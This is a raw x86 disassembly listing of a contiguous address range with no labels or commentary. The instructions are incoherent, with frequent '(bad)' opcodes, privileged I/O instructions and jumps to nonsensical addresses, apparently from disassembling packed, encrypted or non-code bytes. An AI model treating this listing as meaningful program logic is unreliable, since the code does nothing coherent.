  4037c5:	adc    BYTE PTR [ebx-0x4c5d264e],0x19
  4037cc:	retf   
  4037cd:	inc    esi
  4037ce:	cmp    al,0x4
  4037d0:	add    eax,0x59259d83
  4037d5:	mov    ds:0x1e39fef1,al
  4037da:	aam    0x75
  4037dc:	inc    edx
  4037dd:	cld    
  4037de:	adc    dh,BYTE PTR [ebx]
  4037e0:	adc    BYTE PTR [eax],dl
  4037e2:	ins    DWORD PTR es:[edi],dx
  4037e3:	cmp    eax,0xb8dc6886
  4037e8:	leave  
  4037e9:	mov    ecx,0xc3fb6a7a
  4037ee:	add    edx,ebp
  4037f0:	mov    ds:0x11009722,al
  4037f5:	dec    eax
  4037f6:	mov    ds:0x54467eee,al
  4037fb:	(bad)  
  4037fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037fd:	les    eax,FWORD PTR [ecx]
  4037ff:	repz dec eax
  403801:	jmp    0x180e79cb
  403806:	(bad)
  403809:	dec    ebp
  40380a:	stc    
  40380b:	lods   al,BYTE PTR ds:[esi]
  40380c:	mov    bh,0x60
  40380e:	cmp    al,0x97
  403810:	int    0x9
  403812:	inc    edi
  403813:	in     eax,0x6
  403815:	xor    esi,esp
  403817:	push   ds
  403818:	fdiv   DWORD PTR [eax]
  40381a:	dec    eax
  40381b:	push   ebx
  40381c:	xor    BYTE PTR [eax],bh
  40381e:	popf   
  40381f:	into   
  403820:	lock dec esi
  403822:	retf   0xc853
  403825:	ret    0xaa68
  403828:	push   esp
  403829:	dec    edx
  40382a:	and    DWORD PTR [ebx+0x40],esi
  40382d:	sbb    eax,0xc9005d60
  403832:	(bad)  [edx-0x21]
  403835:	out    0x9a,al
  403837:	sub    dl,BYTE PTR [esi-0x3cde4bba]
  40383d:	jmp    0x403855
  40383f:	inc    edi
  403840:	stos   DWORD PTR es:[edi],eax
  403841:	sub    al,0xb5
  403843:	sbb    cl,BYTE PTR [eax-0x51]
  403846:	mov    edx,esi
  403848:	mov    eax,cs
  40384a:	inc    edx
  40384b:	int3   
  40384c:	dec    esp
  40384d:	gs es xchg ecx,eax
  403850:	aam    0xac
  403852:	mov    al,0x5e
  403854:	dec    esi
  403855:	daa    
  403856:	aas    
  403857:	dec    eax
  403858:	aaa    
  403859:	mov    bh,dl
  40385b:	icebp  
  40385c:	mov    dh,0xf2
  40385e:	ins    DWORD PTR es:[edi],dx
  40385f:	cmp    ch,BYTE PTR [edx-0x7f]
  403862:	mov    al,0xb3
  403864:	mov    edi,0x8c2ea1d6
  403869:	jecxz  0x403899
  40386b:	scas   al,BYTE PTR es:[edi]
  40386c:	mul    DWORD PTR [eax+0x63]
  40386f:	in     eax,dx
  403870:	mov    ch,0x71
  403872:	push   esp
  403873:	call   0xf64fadcb
  403878:	sub    DWORD PTR [ebp-0x55],ebp
  40387b:	xchg   BYTE PTR [edi+0x29f1cad1],ah
  403881:	fadd   DWORD PTR [edx]
  403883:	lahf   
  403884:	jb     0x403811
  403886:	mov    edx,0x8b24f3fa
  40388b:	out    dx,al
  40388c:	shr    BYTE PTR [esi],1
  40388e:	jbe    0x40387f
  403890:	gs clc 
  403892:	mov    ebx,DWORD PTR [esi-0x32]
  403895:	push   ds
  403896:	imul   BYTE PTR [eax-0x44]
  403899:	jnp    0x40384b
  40389b:	es dec esp
  40389d:	push   ds
  40389e:	outs   dx,BYTE PTR ds:[esi]
  40389f:	mov    dh,0xae
  4038a1:	stos   DWORD PTR es:[edi],eax
  4038a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038a3:	push   ebp
  4038a4:	inc    ecx
  4038a5:	and    al,0x1b
  4038a7:	adc    BYTE PTR [ecx-0x3fb3d83c],al
  4038ad:	aad    0x93
  4038af:	fwait
  4038b0:	dec    ecx
  4038b1:	lahf   
  4038b2:	mov    esp,0xc869ed79
  4038b7:	jnp    0x4038c5
  4038b9:	inc    edx
  4038ba:	cdq    
  4038bb:	ins    DWORD PTR es:[edi],dx
  4038bc:	hlt    
  4038bd:	cmp    ah,BYTE PTR [ebp+0x79c86a48]
  4038c3:	popa   
  4038c4:	mov    al,ds:0x8f2cb077
  4038c9:	cwde   
  4038ca:	adc    al,0xb9
  4038cc:	fdivr  DWORD PTR [esi+0x7dbc711d]
  4038d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038d3:	lea    esp,[edi]
  4038d5:	pop    ebx
  4038d6:	rol    DWORD PTR [ecx+0x2d],1
  4038d9:	sub    BYTE PTR [edi],0x7e
  4038dc:	or     esi,esi
  4038de:	cdq    
  4038df:	mov    cl,0xef
  4038e1:	ret    0x759c
  4038e4:	fst    DWORD PTR [ebx+0x4d]
  4038e7:	arpl   WORD PTR [edx+0x73],dx
  4038ea:	mul    BYTE PTR [ebp+0x26]
  4038ed:	test   al,0xa4
  4038ef:	xchg   BYTE PTR [esi+0x3ed8990d],al
  4038f5:	retf   
  4038f6:	das    
  4038f7:	prefetch BYTE PTR [ecx+0x73332e91]
  4038fe:	adc    al,ah
  403900:	mov    esi,0x74788f6a
  403905:	sahf   
  403906:	push   esp
  403907:	jle    0x403919
  403909:	out    dx,eax
  40390a:	or     ch,BYTE PTR [ecx]
  40390c:	iret   
  40390d:	sbb    cl,BYTE PTR [edi]
  40390f:	imul   esi,DWORD PTR [ebp-0x36db4113],0xffffffe3
  403916:	int    0x96
  403918:	cmp    eax,edi
  40391a:	add    dl,bl
  40391c:	dec    esp
  40391d:	pop    edi
  40391e:	pop    es
  40391f:	dec    ecx
  403920:	mov    ebp,0xd7963724
  403925:	int    0xcf
  403927:	popf   
  403928:	std    
  403929:	jmp    0xf7609365
  40392e:	imul   DWORD PTR [edx+ebp*1-0x3fdcbb1e]
  403935:	je     0x4038e8
  403937:	jns    0x40390f
  403939:	(bad)  
  40393a:	sbb    al,0x16
  40393c:	stos   DWORD PTR es:[edi],eax
  40393d:	mov    ecx,0x8f27af8b
  403942:	push   ds
  403943:	mov    cl,0xe0
  403945:	stos   DWORD PTR es:[edi],eax
  403946:	jno    0x4039c2
  403948:	sar    dh,1
  40394a:	pop    ds
  40394b:	push   0x5f
  40394d:	std    
  40394e:	stos   DWORD PTR es:[edi],eax
  40394f:	imul   ecx,edi,0x9bd049ea
  403955:	enter  0x745f,0x41
  403959:	jne    0x403945
  40395b:	xor    eax,0x4abd4909
  403960:	lgs    eax,FWORD PTR [ebx]
  403963:	ret    0x132b
  403966:	retf   
  403967:	stos   DWORD PTR es:[edi],eax
  403968:	sub    BYTE PTR [edi-0x13],dl
  40396b:	jo     0x403956
  40396d:	pop    ebp
  40396e:	inc    edi
  40396f:	xchg   edi,eax
  403970:	mov    WORD PTR [ecx+0x4e],ds
  403973:	sub    al,0xc2
  403975:	inc    edi
  403976:	pusha  
  403977:	or     eax,0xf04918d2
  40397c:	loopne 0x403908
  40397e:	push   ecx
  40397f:	cmp    ch,ah
  403981:	dec    ebx
  403982:	test   edi,esp
  403984:	inc    eax
  403985:	add    eax,0x7f47a1d8
  40398a:	in     al,0x34
  40398c:	push   eax
  40398d:	cmp    ebx,DWORD PTR [ebx-0x4a]
  403990:	ret    
  403991:	scas   al,BYTE PTR es:[edi]
  403992:	out    0xe2,eax
  403994:	sub    al,0xc6
  403996:	dec    ebx
  403997:	pop    ss
  403998:	add    edx,DWORD PTR [edx+0x1dba999f]
  40399e:	xor    DWORD PTR [edx],eax
  4039a0:	repz sbb edx,DWORD PTR [edi]
  4039a3:	xchg   ebp,eax
  4039a4:	and    ebx,ecx
  4039a6:	or     edx,esi
  4039a8:	stc    
  4039a9:	and    cl,ah
  4039ab:	and    al,0x8
  4039ad:	fimul  DWORD PTR [ecx]
  4039af:	push   0xb
  4039b1:	mov    ebx,ebp
  4039b3:	fimul  WORD PTR [ebx+0x41]
  4039b6:	pop    ebp
  4039b7:	dec    eax
  4039b8:	and    eax,0x68a1ab39
  4039bd:	into   
  4039be:	jle    0x403989
  4039c0:	test   BYTE PTR [eax-0x6],bl
  4039c3:	xor    BYTE PTR [eax],0x8d
  4039c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039c7:	out    0x31,eax
  4039c9:	fidivr DWORD PTR [edx-0x6be61c25]
  4039cf:	mov    esp,0xc2074386
  4039d4:	xor    al,0x35
  4039d6:	hlt    
  4039d7:	push   esp
  4039d8:	mov    dh,0x96
  4039da:	popf   
  4039db:	and    DWORD PTR [edi+0x4b],0x68
  4039df:	stc    
  4039e0:	xchg   BYTE PTR [ebx+edx*1-0x17],al
  4039e4:	mov    bl,0xd8
  4039e6:	sub    ebp,DWORD PTR [eax]
  4039e8:	mov    esi,DWORD PTR [ebx+0x2b38d192]
  4039ee:	xchg   eax,ebp
  4039f0:	jb     0x4039e5
  4039f2:	test   al,0x7d
  4039f4:	xchg   esi,eax
  4039f5:	inc    edx
  4039f6:	(bad)  
  4039f7:	mov    ecx,0xa798f9e9
  4039fc:	add    edi,0xffffffe9
  4039ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a00:	popf   
  403a01:	mov    esp,0xf8a423c4
  403a06:	cmp    BYTE PTR [ecx],cl
  403a08:	cmp    BYTE PTR [edx-0x21],bh
  403a0b:	ins    DWORD PTR es:[edi],dx
  403a0c:	test   DWORD PTR ds:0x77443676,0xedb670bc
  403a16:	loopne 0x403a25
  403a18:	mov    ah,0x34
  403a1a:	int3   
  403a1b:	retf   0x5974
  403a1e:	fwait
  403a1f:	xor    BYTE PTR [ebx+0x7519e14f],ch
  403a25:	add    eax,0x6afd7421
  403a2a:	nop
  403a2b:	loop   0x403a3a
  403a2d:	(bad)  
  403a2e:	xchg   esi,eax
  403a2f:	adc    ah,BYTE PTR [esi+ebp*2+0x3b]
  403a33:	(bad)  
  403a34:	mov    ecx,0x6a08ccf1
  403a39:	lahf   
  403a3a:	es in  eax,dx
  403a3c:	cmp    bh,BYTE PTR [ebp+0x2b]
  403a3f:	jge    0x403a6a
  403a41:	nop
  403a42:	arpl   WORD PTR [ebx-0x60b7e6a3],bx
  403a48:	bnd call 0xd8b7ee41
  403a4e:	inc    eax
  403a4f:	fst    DWORD PTR [edx-0x6daa5be]
  403a55:	sub    ebx,DWORD PTR [eax+0x56]
  403a58:	mov    ebp,0x6975bdb3
  403a5d:	xlat   BYTE PTR ds:[ebx]
  403a5e:	icebp  
  403a5f:	sub    BYTE PTR [ebp+0x5bf177ae],cl
  403a65:	or     DWORD PTR [ecx],0x6e
  403a68:	mov    BYTE PTR [bx+di],cl
  403a6b:	push   ax
  403a6d:	jns    0x403ab9
  403a6f:	cs adc al,0x4a
  403a72:	cmovle edi,ebp
  403a75:	jge    0x403af4
  403a77:	xchg   esp,eax
  403a78:	sbb    DWORD PTR [ebp+0x3a008937],0xb3fa792c
  403a82:	ins    DWORD PTR es:[edi],dx
  403a83:	fcomp  st(4)
  403a85:	fisttp WORD PTR [esi+ebx*4-0x77]
  403a89:	dec    esi
  403a8a:	aaa    
  403a8b:	sub    al,0x95
  403a8d:	pop    edx
  403a8e:	mov    DWORD PTR [edi],esi
  403a90:	not    BYTE PTR [eax-0x42]
  403a93:	pop    edi
  403a94:	dec    ecx
  403a95:	popf   
  403a96:	xchg   ecx,eax
  403a97:	(bad)  
  403a98:	push   eax
  403a99:	sbb    eax,0xa09a2424
  403a9e:	and    eax,0xbde66b8d
  403aa3:	sbb    DWORD PTR [ebx+ebx*4+0x32ac2044],ebx
  403aaa:	xchg   esp,eax
  403aab:	call   0x4afc3eb
  403ab0:	aad    0xc8
  403ab2:	push   edi
  403ab3:	push   ebx
  403ab4:	inc    edi
  403ab5:	mov    ecx,0xd286f0aa
  403aba:	lods   al,BYTE PTR ds:[esi]
  403abb:	jns    0x403b3a
  403abd:	adc    al,0x28
  403ac0:	cmp    eax,0x935a0d47
  403ac5:	pop    esi
  403ac6:	jge    0x403b11
  403ac8:	shr    BYTE PTR [esi+0x78],cl
  403acb:	ins    DWORD PTR es:[edi],dx
  403acc:	and    bh,bl
  403ace:	scas   al,BYTE PTR es:[edi]
  403acf:	push   cs
  403ad0:	xchg   ebx,eax
  403ad1:	je     0x403aed
  403ad3:	mov    al,ds:0xf7663df0
  403ad8:	pop    es
  403ad9:	mov    ebp,0xc90f7e08
  403ade:	ret    
  403adf:	dec    DWORD PTR [edi+0x6a]
  403ae2:	pop    ebx
  403ae3:	mov    BYTE PTR [ebx+0x59337695],al
  403ae9:	or     eax,0x5c36e656
  403aee:	gs shr ebx,1
  403af1:	inc    eax
  403af2:	stc    
  403af3:	push   ebp
  403af4:	(bad)  
  403af5:	mov    ch,BYTE PTR ds:0xb46d6b8f
  403afb:	outs   dx,BYTE PTR ds:[esi]
  403afc:	mov    al,ds:0x228fbd0f
  403b01:	leave  
  403b02:	cs aas 
  403b04:	pop    ebx
  403b05:	cli    
  403b06:	popf   
  403b07:	cmp    al,0xcf
  403b09:	xchg   BYTE PTR [ecx+0x11],ch
  403b0c:	cli    
  403b0d:	xlat   BYTE PTR ds:[ebx]
  403b0e:	je     0x403b58
  403b10:	mov    edi,0x77ab442a
  403b15:	fsubr  DWORD PTR [ecx-0x5c]
  403b18:	or     al,0x25
  403b1a:	lock into 
  403b1c:	repz cli 
  403b1e:	dec    ebx
  403b1f:	dec    esi
  403b20:	scas   al,BYTE PTR es:[edi]
  403b21:	lods   eax,DWORD PTR ds:[esi]
  403b22:	lds    esp,FWORD PTR [ecx-0x12]
  403b25:	stos   BYTE PTR es:[edi],al
  403b26:	sar    cl,cl
  403b28:	xchg   edx,eax
  403b29:	sar    bh,1
  403b2b:	jmp    0xdcef4556
  403b30:	(bad)  
  403b32:	push   0x74
  403b34:	inc    ecx
  403b35:	cmp    al,0x6f
  403b37:	mul    BYTE PTR [ecx-0x2847e865]
  403b3d:	ficomp DWORD PTR [edi]
  403b3f:	mov    DWORD PTR [edi+0x5a],0xe08ebca2
  403b46:	adc    bl,BYTE PTR [esi+edi*1]
  403b49:	mov    bl,0xa
  403b4b:	xchg   esi,eax
  403b4c:	sub    BYTE PTR [ebx-0x22dc7d1a],ch
  403b52:	fsincos 
  403b54:	popa   
  403b55:	imul   esp,DWORD PTR [ebp-0xdf7560f],0xffffffb5
  403b5c:	pop    eax
  403b5d:	das    
  403b5e:	dec    esi
  403b5f:	outs   dx,BYTE PTR ds:[esi]
  403b60:	push   ebx
  403b61:	imul   ebp,eax,0x5a
  403b64:	and    eax,DWORD PTR [ebp-0x4eacfae]
  403b6a:	cld    
  403b6b:	push   edx
  403b6c:	jae    0x403bdd
  403b6e:	adc    ch,dl
  403b70:	push   esi
  403b71:	lock stc 
  403b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b74:	dec    edi
  403b75:	cmp    BYTE PTR [esi+edi*8+0xef70c44],dh
  403b7c:	scas   al,BYTE PTR es:[edi]
  403b7d:	mov    dh,0x88
  403b7f:	test   BYTE PTR [eax+0x2a],ch
  403b82:	(bad)  
  403b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b84:	mov    edx,0xdf8a4973
  403b89:	xor    eax,eax
  403b8b:	mov    al,ds:0x82255043
  403b90:	xor    ah,BYTE PTR [edx]
  403b92:	mov    edi,0x7c47623d
  403b97:	jns    0x403c0c
  403b99:	imul   eax,DWORD PTR es:[edi-0x530d5e8d],0x56
  403ba1:	xchg   ecx,eax
  403ba2:	gs sti 
  403ba4:	out    dx,al
  403ba5:	scas   al,BYTE PTR es:[edi]
  403ba6:	pop    ebx
  403ba7:	pop    ecx
  403ba8:	fbld   TBYTE PTR [esi+0xb9cf25f]
  403bae:	aad    0xb6
  403bb0:	xchg   edi,eax
  403bb1:	inc    ebp
  403bb2:	adc    bl,ch
  403bb4:	mov    eax,0xfff72140
  403bb9:	inc    edi
  403bba:	dec    eax
  403bbb:	fwait
  403bbc:	loop   0x403bae
  403bbe:	push   esi
  403bbf:	xor    al,0x66
  403bc1:	mov    cl,0x5e
  403bc3:	jp     0x403b4e
  403bc5:	jae    0x403bbf
  403bc7:	mov    BYTE PTR [edi+eax*4+0x17c9223c],0x8f
  403bcf:	leave  
  403bd0:	push   0x6d
  403bd2:	loopne 0x403c29
  403bd4:	jno    0x403b95
  403bd6:	and    DWORD PTR [eax+0x672c156e],ecx
  403bdc:	in     al,dx
  403bdd:	sbb    BYTE PTR [edx],dl
  403bdf:	cs push esi
  403be1:	push   ss
  403be2:	mov    ch,0x66
  403be4:	in     al,dx
  403be5:	fsub   DWORD PTR [esp+eax*4]
  403be8:	xor    ebx,DWORD PTR [eax+0x1]
  403beb:	push   esi
  403bec:	mov    ecx,0x242f87e9
  403bf1:	mov    ebp,0xaacf976
  403bf6:	sbb    ecx,esi
  403bf8:	xor    eax,0xe86ef7a2
  403bfd:	jne    0x403c01
  403bff:	cmp    cl,ch
  403c01:	jnp    0x403bdb
  403c03:	add    al,0xa1
  403c05:	adc    ebx,ebx
  403c07:	mov    ch,0x23
  403c09:	xchg   esp,eax
  403c0a:	(bad)  
  403c0b:	lock inc edi
  403c0d:	stos   BYTE PTR es:[edi],al
  403c0e:	fistp  WORD PTR [esi-0x1570ded3]
  403c14:	adc    eax,0x5d2e0889
  403c19:	lods   eax,DWORD PTR ds:[esi]
  403c1a:	fdiv   st,st(5)
  403c1c:	aam    0x5d
  403c1e:	sbb    ebx,ebp
  403c20:	lock enter 0xce4c,0xcb
  403c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c26:	shl    DWORD PTR [edx],0x22
  403c29:	sti    
  403c2a:	jb     0x403bb7
  403c2c:	sbb    edx,DWORD PTR [edx-0x3]
  403c2f:	push   eax
  403c30:	xchg   edx,eax
  403c31:	mov    ebx,esp
  403c33:	pop    esp
  403c34:	xlat   BYTE PTR ds:[ebx]
  403c35:	fadd   QWORD PTR [eax-0x24]
  403c38:	ret    0x5c42
  403c3b:	loopne 0x403bdc
  403c3d:	sahf   
  403c3e:	xor    eax,0x2ba5b65f
  403c43:	and    DWORD PTR [ecx-0x6e],esi
  403c46:	(bad)  
  403c47:	jge    0x403bc9
  403c49:	fmul   st,st(0)
  403c4b:	test   DWORD PTR [ebp+0x29],edi
  403c4e:	ins    BYTE PTR es:[edi],dx
  403c4f:	mov    ebp,ss
  403c51:	and    eax,0x7e139e65
  403c56:	xor    eax,0x16f755e2
  403c5b:	scas   eax,DWORD PTR es:[edi]
  403c5c:	aad    0x8d
  403c5e:	mov    ds:0x7ece3d5b,eax
  403c63:	stc    
  403c64:	sub    BYTE PTR [edx-0x55],bl
  403c67:	daa    
  403c68:	dec    esi
  403c69:	nop
  403c6a:	out    dx,al
  403c6b:	sub    eax,0x192ab643
  403c70:	ret    0x5e2c
  403c73:	push   ecx
  403c74:	mov    BYTE PTR [ebx],cl
  403c76:	loope  0x403c31
  403c78:	hlt    
  403c79:	das    
  403c7a:	jecxz  0x403cb9
  403c7c:	mov    ebx,0xcc79ec3c
  403c81:	shl    DWORD PTR [eax-0x8],0x4b
  403c85:	mov    dl,0x10
  403c87:	dec    esi
  403c88:	int3   
  403c89:	xchg   edx,eax
  403c8a:	or     DWORD PTR [ebp+0x5041fb35],ecx
  403c90:	je     0x403cd6
  403c92:	mov    bl,0xaa
  403c94:	shr    BYTE PTR ds:0x76675dfe,1
  403c9a:	scas   al,BYTE PTR es:[edi]
  403c9b:	jmp    0x403c29
  403c9d:	and    eax,0xadb129f
  403ca2:	adc    BYTE PTR [eax],0xa2
  403ca5:	imul   ebp,DWORD PTR [ebx-0x1fb4f52c],0xe5087d22
  403caf:	scas   eax,DWORD PTR es:[edi]
  403cb0:	adc    ecx,esi
  403cb2:	dec    ecx
  403cb3:	loopne 0x403c5a
  403cb5:	shr    DWORD PTR [ecx],1
  403cb7:	jl     0x403c4d
  403cb9:	push   0x6f
  403cbb:	xchg   ecx,eax
  403cbc:	fist   DWORD PTR [ebp+0x29d1bc95]
  403cc2:	xchg   ecx,eax
  403cc3:	mov    ah,0xc0
  403cc5:	out    0x8e,eax
  403cc7:	fistp  DWORD PTR es:[esi]
  403cca:	gs fucompp 
  403ccd:	mov    esp,ebp
  403ccf:	adc    al,0xd3
  403cd1:	retf   0xc1f
  403cd4:	xor    eax,0xffffffca
  403cd7:	daa    
  403cd8:	push   ebx
  403cd9:	xchg   ebp,eax
  403cda:	mov    cl,0x55
  403cdc:	pushf  
  403cdd:	(bad)  
  403cde:	(bad)  
  403cdf:	imul   ebx,DWORD PTR ds:0x71473936,0xd
  403ce6:	out    dx,al
  403ce7:	mov    ecx,0x1e198a81
  403cec:	lods   al,BYTE PTR ds:[esi]
  403ced:	adc    ah,BYTE PTR [ebp+0x447a9866]
  403cf3:	push   0x3a721217
  403cf8:	test   al,0xf9
  403cfa:	shr    BYTE PTR [edi+0x7],1
  403cfd:	cld    
  403cfe:	aaa    
  403cff:	cli    
  403d00:	out    0x4c,al
  403d02:	jne    0x403c94
  403d04:	adc    BYTE PTR [edi+0x5d911a12],al
  403d0a:	(bad)  
  403d0b:	repnz cmp al,0xdc
  403d0e:	and    BYTE PTR [edi],bl
  403d10:	sub    DWORD PTR [esi+0x49],esi
  403d13:	xchg   edi,eax
  403d14:	aaa    
  403d15:	test   al,0x73
  403d17:	inc    esi
  403d18:	inc    ebp
  403d19:	js     0x403d02
  403d1b:	call   0x21d086bb
  403d20:	push   cs
  403d21:	in     eax,dx
  403d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d23:	xchg   ebp,eax
  403d24:	sbb    DWORD PTR [ebx+0x8d3e827],edx
  403d2a:	xlat   BYTE PTR ds:[ebx]
  403d2b:	jg     0x403cc7
  403d2d:	fs push edi
  403d2f:	add    DWORD PTR [edx+0x6f52cd5],edi
  403d35:	int    0x6f
  403d37:	rol    DWORD PTR [ebx],1
  403d39:	out    dx,al
  403d3a:	mov    bl,0x2b
  403d3c:	dec    eax
  403d3d:	jle    0x403d5f
  403d3f:	fwait
  403d40:	scas   eax,DWORD PTR es:[edi]
  403d41:	jnp    0x403da5
  403d43:	pop    ds
  403d44:	ja     0x403d2b
  403d46:	inc    esp
  403d47:	mov    ebp,0x55237da2
  403d4c:	ficomp DWORD PTR [edx-0x19]
  403d4f:	lds    edi,FWORD PTR [eax-0x4]
  403d52:	pop    ds
  403d53:	shl    DWORD PTR [esi+ebp*1],1
  403d56:	fs inc ebx
  403d58:	sahf   
  403d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d5a:	push   ss
  403d5b:	xchg   edx,eax
  403d5c:	mov    esp,0x5fbfbfdf
  403d61:	lds    edx,FWORD PTR [ebx+0x32d51412]
  403d67:	aad    0x73
  403d69:	ins    DWORD PTR es:[edi],dx
  403d6a:	pop    edi
  403d6b:	aaa    
  403d6c:	cld    
  403d6d:	icebp  
  403d6e:	dec    eax
  403d6f:	cmp    DWORD PTR [edi+ebx*4],esi
  403d72:	loop   0x403cfc
  403d74:	fmul   DWORD PTR [edx]
  403d76:	lahf   
  403d77:	fwait
  403d78:	mov    eax,ds:0x8d669ff3
  403d7d:	jmp    0x403df0
  403d7f:	pop    eax
  403d80:	ins    DWORD PTR es:[edi],dx
  403d81:	cmp    dh,BYTE PTR [edi+edx*1]
  403d84:	imul   eax,DWORD PTR [ecx-0x500df38d],0x652d726
  403d8e:	dec    ebx
  403d8f:	sbb    eax,0x3574e488
  403d94:	mov    ebx,0x8818ecb7
  403d99:	aam    0x44
  403d9b:	xchg   ecx,eax
  403d9c:	aam    0x68
  403d9e:	jne    0x403d5f
  403da0:	push   ecx
  403da1:	xchg   DWORD PTR [edi-0x1e9971c],edi
  403da7:	mov    dl,0x8f
  403da9:	test   al,0xc2
  403dab:	jl     0x403d64
  403dad:	sub    ch,BYTE PTR [edx]
  403daf:	mov    dl,0xd5
  403db1:	inc    ebp
  403db2:	mov    ah,0x7
  403db4:	lahf   
  403db5:	push   edi
  403db6:	pop    edi
  403db7:	mov    dh,0x57
  403db9:	mov    al,0x44
  403dbb:	stos   DWORD PTR es:[edi],eax
  403dbc:	nop
  403dbd:	pop    edx
  403dbe:	jne    0x403de4
  403dc0:	mov    WORD PTR [ecx],ss
  403dc2:	(bad)  
  403dc3:	pusha  
  403dc4:	sub    edi,ecx
  403dc6:	cs jge 0x403df0
  403dc9:	int3   
  403dca:	cmp    edx,DWORD PTR [edx+0x642cb4ac]
  403dd0:	push   0xb5c8e1b4
  403dd5:	loop   0x403d83
  403dd7:	call   0xa7b7:0xb97b8349
  403dde:	pushf  
  403ddf:	mov    cl,0x9a
  403de1:	and    cl,BYTE PTR [ebx-0x57]
  403de4:	jne    0x403d87
  403de6:	sub    eax,0x5b54c52
  403deb:	fist   DWORD PTR [ebx+esi*4]
  403dee:	retf   0x7339
  403df1:	clc    
  403df2:	jbe    0x403de8
  403df4:	inc    edi
  403df5:	(bad)  
  403df6:	push   eax
  403df7:	mov    cs,WORD PTR [ecx-0x46627bbe]
  403dfd:	fisub  DWORD PTR [eax+0x4fafb209]
  403e03:	push   ss
  403e04:	or     ch,ch
  403e06:	lods   eax,DWORD PTR ds:[esi]
  403e07:	dec    ebx
  403e08:	mov    ds:0xdf4be39e,al
  403e0d:	dec    esi
  403e0e:	not    BYTE PTR [ecx+0x38e4d362]
  403e14:	push   edi
  403e16:	and    ebx,ebp
  403e18:	enter  0x7aca,0x7c
  403e1c:	xchg   ebp,eax
  403e1d:	jge    0x403e41
  403e1f:	cmp    dh,BYTE PTR [eax*8-0x4e4e32c9]
  403e26:	push   cs
  403e27:	pop    ds
  403e28:	mov    dl,0xd1
  403e2a:	sahf   
  403e2b:	xchg   ebx,eax
  403e2c:	pop    edi
  403e2d:	mov    ds:0xbcef13a8,al
  403e32:	mov    esi,0xa51074fe
  403e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e38:	out    dx,al
  403e39:	xor    BYTE PTR [ecx+0x227ca54],ah
  403e3f:	pop    edi
  403e40:	inc    eax
  403e41:	fsub   DWORD PTR [edx+0x41ed37dc]
  403e47:	ficomp WORD PTR ds:0x40a51219
  403e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e4e:	jb     0x403e6c
  403e50:	pop    ebp
  403e51:	pushf  
  403e52:	(bad)  
  403e53:	imul   esp,DWORD PTR [ecx],0xf5e38ba5
  403e59:	mov    eax,0xf849bf8
  403e5e:	pop    ss
  403e5f:	adc    bl,dl
  403e61:	imul   ebp,DWORD PTR [edi],0x4d
  403e64:	(bad)  [edx]
  403e66:	ja     0x403eb3
  403e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e69:	lods   eax,DWORD PTR ds:[esi]
  403e6a:	loop   0x403dfe
  403e6c:	push   esi
  403e6d:	cmp    eax,DWORD PTR [ecx]
  403e6f:	mov    al,ds:0x6f6b4728
  403e74:	fisub  WORD PTR [edi-0x54]
  403e77:	pop    es
  403e78:	push   eax
  403e79:	scas   al,BYTE PTR es:[edi]
  403e7a:	jno    0x403e09
  403e7c:	stc    
  403e7d:	je     0x403e31
  403e7f:	mov    eax,ds:0x5e803284
  403e84:	vpsrad xmm5,xmm4,XMMWORD PTR [edx]
  403e88:	dec    eax
  403e89:	in     al,dx
  403e8a:	mov    ah,0x14
  403e8c:	int    0x73
  403e8e:	(bad)  [ebx-0x41a3ba38]
  403e94:	je     0x403ee6
  403e96:	dec    ecx
  403e97:	lahf   
  403e98:	mov    ebp,DWORD PTR [eax]
  403e9a:	stos   BYTE PTR es:[edi],al
  403e9b:	inc    edx
  403e9c:	gs add esi,ecx
  403e9f:	cmc    
  403ea0:	std    
  403ea1:	lds    ebp,FWORD PTR fs:[ebx]
  403ea4:	ret    
  403ea5:	cmp    bl,BYTE PTR [eax+0xd53468d]
  403eab:	les    ebp,FWORD PTR [ecx+0x5cd17b4]
  403eb1:	dec    esp
  403eb2:	adc    eax,0x747f463f
  403eb7:	icebp  
  403eb8:	outs   dx,DWORD PTR ds:[esi]
  403eb9:	lock pop ss
  403ebb:	and    al,0x68
  403ebd:	or     bl,BYTE PTR [ebx+0x4]
  403ec0:	loope  0x403e9e
  403ec2:	hlt    
  403ec3:	adc    esi,esp
  403ec5:	sar    DWORD PTR [edi+0x4f4fdcbd],0xb3
  403ecc:	test   eax,0xf73a1ecd
  403ed1:	lea    ecx,[ebx+0x229e4bfb]
  403ed7:	dec    eax
  403ed8:	inc    ebx
  403ed9:	ss xchg ebp,eax
  403edb:	loope  0x403e8a
  403edd:	mov    BYTE PTR [esp+edx*1+0x4c68144b],0x37
  403ee5:	push   ss
  403ee6:	cmp    eax,0xbbaa6a17
  403eeb:	pop    es
  403eec:	mov    ?,WORD PTR [edx-0x16]
  403eef:	ja     0x403f5f
  403ef1:	pusha  
  403ef2:	pop    ebp
  403ef3:	jne    0x403ed8
  403ef5:	sub    ecx,DWORD PTR [ecx+esi*8]
  403ef8:	test   DWORD PTR [ebx+eax*8+0x4],esi
  403efc:	mov    esp,0x4d10df1
  403f01:	xchg   esp,eax
  403f02:	mov    al,0x55
  403f04:	(bad)  
  403f05:	push   0x33c265f3
  403f0a:	cs in  al,dx
  403f0c:	fild   DWORD PTR [ecx]
  403f0e:	cmp    ebp,0x9a9234bf
  403f14:	push   eax
  403f15:	ja     0x403ec8
  403f17:	adc    BYTE PTR [edx+0x50],bh
  403f1a:	not    DWORD PTR [ecx]
  403f1c:	adc    esp,DWORD PTR [ebp-0x3db80a66]
  403f22:	xor    eax,0x944e58b1
  403f27:	mov    edi,0x6408fbfe
  403f2c:	(bad)  
  403f2d:	sub    esi,DWORD PTR [eax-0x5f]
  403f30:	or     al,0xce
  403f32:	aam    0x7f
  403f34:	mov    WORD PTR [edi-0x78],ds
  403f37:	sub    ecx,DWORD PTR [edi+eax*2-0x55]
